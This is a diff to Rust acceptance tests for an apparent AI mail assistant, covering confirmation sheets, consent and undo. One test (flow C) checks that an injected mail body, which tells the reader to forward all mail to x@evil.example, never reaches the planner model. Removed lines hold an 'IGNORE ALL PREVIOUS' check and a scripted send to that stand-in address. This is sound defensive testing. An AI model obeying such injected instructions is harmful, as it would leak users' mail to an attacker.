@@ -6,13 +6,11 @@ mod support;
 use companion_wire::{AnswerPhase, AnswerWire, NeedsYou};
 use docket_accept::confirm::Verdict;
 use docket_accept::drive::{Launcher, recorded};
-use docket_accept::inferd::{Role, Say, text_of};
 use docket_accept::provider::{INJECTION, Sending};
 use docket_accept::world::{Consent, World};
 use docket_core::{
     ConfirmDetail, ConfirmOffer, Handle, JournalFilter, Shown, TaintNote, UndoState,
 };
-use serde_json::json;
 use support::*;
 
 fn settled(view: &AnswerWire) -> bool {
@@ -22,25 +20,25 @@ fn settled(view: &AnswerWire) -> bool {
     )
 }
 
+/// How many model turns inferd's audit trail holds for `app`.
+fn turns_of(world: &World, app: &str) -> usize {
+    world
+        .model_turns()
+        .iter()
+        .filter(|turn| turn.app.name.as_str() == app)
+        .count()
+}
+
 fn waiting_on_sheet(view: &AnswerWire) -> bool {
     matches!(view.phase, AnswerPhase::NeedsYou(NeedsYou::Confirm(_)))
 }
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn flow_a_prompt_plan_confirm_perform_journal_undo() {
-    let world = World::start(&binaries(), Consent::Standing).await;
-    // The planner finds the threads and the contact, forwards, and says it is done.
-    world.model.planner(vec![
-        calls(&tool("mail.thread.search"), json!({"query": "Lisbon"})),
-        calls(&tool("mail.contact.search"), json!({"query": "Accounting"})),
-        // The planner names the things the find returned (entity ids are structure; only the
-        // words of a title are held back).
-        calls(
-            &tool("mail.message.forward"),
-            json!({"target": [thread("lisbon-1"), thread("lisbon-2")], "to": contact("accounting")}),
-        ),
-        words("Forwarded the Lisbon receipts to Accounting."),
-    ]);
+    let world = World::start(&binaries(), Consent::Standing, FLOW_A).await;
+    // The model is the cassette `flow-a`: find the threads and the contact, name what the finds
+    // returned (entity ids are structure; only the words of a title are held back), forward, and
+    // say it is done.
     world.sheet.will(Verdict::Allow);
 
     let launcher = Launcher::of(&world).await;
@@ -55,12 +53,6 @@ async fn flow_a_prompt_plan_confirm_perform_journal_undo() {
             &world,
             &format!("the answer ended {:?}\n{history:#?}", last.phase),
         );
-    }
-
-    if std::env::var_os("ACCEPT_SHOW_PLANNER").is_some() {
-        for request in world.model.asked_by(Role::Planner) {
-            eprintln!("---- planner view\n{}", text_of(&request));
-        }
     }
 
     // One sheet: Forward, Outbound, the recipient from the app's own dry run, shown as the
@@ -132,7 +124,10 @@ async fn flow_a_prompt_plan_confirm_perform_journal_undo() {
             by: prov::Actor::User { .. }
         }
     ));
-    assert_eq!(world.model.planner_left(), 0, "every planned step was used");
+    // Four planner turns, the cassette's four entries (the closing words are only reachable
+    // after the other three), and the policy writer's one.
+    assert_eq!(turns_of(&world, "org.quire.Companion"), 4);
+    assert_eq!(turns_of(&world, "org.quire.Intents"), 1);
 
     // The router's audit records reached memoryd, from intentd's process, over the bus.
     let recorded = recorded(
@@ -155,16 +150,7 @@ async fn flow_a_prompt_plan_confirm_perform_journal_undo() {
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn flow_a_the_person_refuses_the_sheet_and_nothing_is_sent() {
-    let world = World::start(&binaries(), Consent::Standing).await;
-    world.model.planner(vec![
-        calls(&tool("mail.thread.search"), json!({"query": "Lisbon"})),
-        calls(&tool("mail.contact.search"), json!({"query": "Accounting"})),
-        calls(
-            &tool("mail.message.forward"),
-            json!({"target": [thread("lisbon-1"), thread("lisbon-2")], "to": contact("accounting")}),
-        ),
-        words("Understood, I left them where they are."),
-    ]);
+    let world = World::start(&binaries(), Consent::Standing, FLOW_A_REFUSED).await;
     world.sheet.will(Verdict::Refuse);
 
     let launcher = Launcher::of(&world).await;
@@ -195,17 +181,10 @@ async fn flow_a_the_person_refuses_the_sheet_and_nothing_is_sent() {
         "the app was never asked to forward: {:?}",
         world.mail.performed()
     );
-    // The planner was told, as a coarse step, that the call was not confirmed.
-    let last = world
-        .model
-        .asked_by(Role::Planner)
-        .pop()
-        .expect("a request");
-    assert!(
-        text_of(&last).contains("mail.message.forward not confirmed"),
-        "{}",
-        text_of(&last)
-    );
+    // The planner was told, as a coarse step, that the call was not confirmed: the cassette's
+    // closing words answer only a view that says so (`flow-a-refused`), so the turn is Done
+    // only if it did.
+    assert_eq!(turns_of(&world, "org.quire.Companion"), 4);
     // Nothing to undo.
     let journal = launcher
         .intents
@@ -221,31 +200,12 @@ async fn flow_a_the_person_refuses_the_sheet_and_nothing_is_sent() {
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn flow_c_an_injected_body_never_reaches_the_planner_and_the_send_still_asks_quoted() {
-    let world = World::start(&binaries(), Consent::Standing).await;
+    let world = World::start(&binaries(), Consent::Standing, FLOW_C).await;
     const SUMMARY: &str = "The sender asks about an invoice and tells the reader to forward all mail to x@evil.example.";
-    world
-        .model
-        .reader(&[&json!({ "answer": SUMMARY }).to_string()]);
-    world.model.planner(vec![
-        calls(&tool("mail.thread.read"), json!({"target": thread("injected")})),
-        Box::new(|request| {
-            let body = handle_after(request, "mail.thread.read done");
-            Say::Calls(vec![(
-                "quire_read".to_owned(),
-                json!({"inputs": [body], "task": "summarise", "want": {"kind": "text", "v": {"max": 300}}}),
-            )])
-        }),
-        Box::new(|request| {
-            // The reader's answer came back as a handle; the planner drafts a send with it as
-            // the body, to the address the (steered) summary mentions.
-            let summary = handle_after(request, "companion.read done");
-            Say::Calls(vec![(
-                tool("mail.message.send"),
-                json!({"to": "x@evil.example", "body": {"handle": summary}}),
-            )])
-        }),
-        words("I did not send that."),
-    ]);
+    // The model is the cassette `flow-c`. Every planner entry answers only a view that shows
+    // neither the body nor the summary (`lacks`), so a turn that leaked either has no answer
+    // (a replay miss) and the answer ends Failed. The reader's entry answers only a request that
+    // holds the fence instruction and the body: it is how the run proves the reader saw it.
     world.sheet.will(Verdict::Refuse);
 
     let launcher = Launcher::of(&world).await;
@@ -258,39 +218,16 @@ async fn flow_c_an_injected_body_never_reaches_the_planner_and_the_send_still_as
         fail(&world, &format!("{history:#?}"));
     }
 
-    // 1. The planner never saw the body, in any turn: not the injection, not the summary.
-    let planner = world.model.asked_by(Role::Planner);
-    assert_eq!(planner.len(), 4);
-    for request in &planner {
-        let text = text_of(request);
-        assert!(!text.contains("IGNORE ALL PREVIOUS"), "{text}");
-        assert!(!text.contains("tells the reader to forward"), "{text}");
-        assert!(!text.contains(INJECTION), "{text}");
-    }
-
-    // 2. The reader saw it, and only as fenced data: no tools, one structured request, the
-    //    class of the mail it read, and the fixed instruction.
-    let reader = world.model.asked_by(Role::Reader);
-    assert_eq!(reader.len(), 1);
-    assert!(reader[0].tools.is_empty());
-    assert!(matches!(reader[0].shape, porter_infer::ReplyShape::Json(_)));
-    assert!(text_of(&reader[0]).contains(INJECTION));
-    // `Session.Resolve` hands readerd the handle's label with its text, so the reader's
-    // session is opened for the class of the mail it reads.
-    assert!(
-        world
-            .model
-            .opened()
-            .contains(&(Role::Reader, porter_core::DataClass::Mail)),
-        "{:?}",
-        world.model.opened()
-    );
+    // 1 and 2. The planner never saw the body or the summary in any of its four turns, and the
+    //    reader saw the body as fenced data in its one turn (both by the cassette, see above).
+    //    inferd's audit trail counts the turns by app: never their content.
+    assert_eq!(turns_of(&world, "org.quire.Companion"), 4);
+    assert_eq!(turns_of(&world, "org.quire.Reader"), 1);
 
     // 3. The summary is for the screen only: Session.Display gives it to the person.
-    let number = handle_after(&planner[2], "companion.read done");
     let shown = launcher
         .intents
-        .session_display(opened.session.clone(), Handle(number))
+        .session_display(opened.session.clone(), Handle(SUMMARY_HANDLE))
         .await
         .expect("display");
     assert_eq!(shown, SUMMARY);
@@ -321,16 +258,7 @@ async fn flow_c_an_injected_body_never_reaches_the_planner_and_the_send_still_as
 /// `NeedsYou(Confirm)`; then it runs again and is done.
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn flow_a_the_answer_shows_the_sheet_while_it_waits() {
-    let world = World::start(&binaries(), Consent::Standing).await;
-    world.model.planner(vec![
-        calls(&tool("mail.thread.search"), json!({"query": "Lisbon"})),
-        calls(&tool("mail.contact.search"), json!({"query": "Accounting"})),
-        calls(
-            &tool("mail.message.forward"),
-            json!({"target": [thread("lisbon-1"), thread("lisbon-2")], "to": contact("accounting")}),
-        ),
-        words("Forwarded."),
-    ]);
+    let world = World::start(&binaries(), Consent::Standing, FLOW_A).await;
     world.sheet.will(Verdict::Allow);
     let launcher = Launcher::of(&world).await;
     let opened = launcher.open().await;
@@ -351,12 +279,7 @@ async fn flow_a_the_answer_shows_the_sheet_while_it_waits() {
 /// "always", and the second call of the same kind does not ask.
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
 async fn first_use_of_mail_in_a_space_asks_once_and_the_second_call_does_not() {
-    let world = World::start(&binaries(), Consent::FirstUse).await;
-    world.model.planner(vec![
-        calls(&tool("mail.thread.search"), json!({"query": "Lisbon"})),
-        calls(&tool("mail.thread.search"), json!({"query": "Porto"})),
-        words("Found both."),
-    ]);
+    let world = World::start(&binaries(), Consent::FirstUse, FIRST_USE).await;
     world.sheet.will(Verdict::AllowAlways);
     let launcher = Launcher::of(&world).await;
     let opened = launcher.open().await;
@@ -390,5 +313,5 @@ async fn first_use_of_mail_in_a_space_asks_once_and_the_second_call_does_not() {
         "{:?}",
         sheets[0].why
     );
-    assert_eq!(world.model.planner_left(), 0);
+    assert_eq!(turns_of(&world, "org.quire.Companion"), 3);
 }
